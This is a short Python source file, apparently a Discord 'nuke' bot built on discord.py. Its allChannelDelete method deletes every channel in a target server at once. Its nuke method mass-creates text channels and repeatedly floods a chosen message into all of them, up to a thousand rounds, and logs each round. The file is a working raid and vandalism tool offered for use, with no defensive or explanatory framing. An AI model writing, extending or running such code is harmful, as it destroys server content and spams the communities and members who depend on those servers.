import threading, traceback, datetime, discord, asyncio, time

logs = {}
stops = []

intents = discord.Intents.all()
class DiscordBot(discord.Client):
    def __init__(self, token:str):
        super().__init__(intents=intents)
        self.token = token
    async def allChannelDelete(self, guildId:str):
        try:
            for guild in self.guilds:
                if guild.id == guildId:
                    break
            await asyncio.gather(*(channel.delete() for channel in guild.channels))
        except:
            print(traceback.format_exc())
    async def nuke(self, logId:str, latency:int, message:str, guildId:str, channelName:str, numberOfExecutions=1000):
        try:
            logs[logId] = ""
            for guild in self.guilds:
                if guild.id == guildId:
                    break
            await asyncio.gather(*(guild.create_text_channel(channelName) for i in range(13)))
            channels = list(guild.channels)
            for i in range(numberOfExecutions):
                if logId in stops:
                    logs.pop(logId)
                    return
                logs[logId] += f"{str(datetime.datetime.now())} Send BotNuke - "
                channel = await guild.create_text_channel(channelName)
                channels.append(channel)
                try:
                    await asyncio.gather(*(channel.send(message) for channel in channels))
                    logs[logId] += "Success"
                except:
                    print(traceback.format_exc())
                    logs[logId] += f"Failed"
                logs[logId] += "\n"
                await asyncio.sleep(latency*0.001)
        except:
            print(traceback.format_exc())
    async def on_ready(self):
        pass
    async def on_message(self, message):
        if message.author.bot:
            return
    def runBot(self):
        self.run(self.token)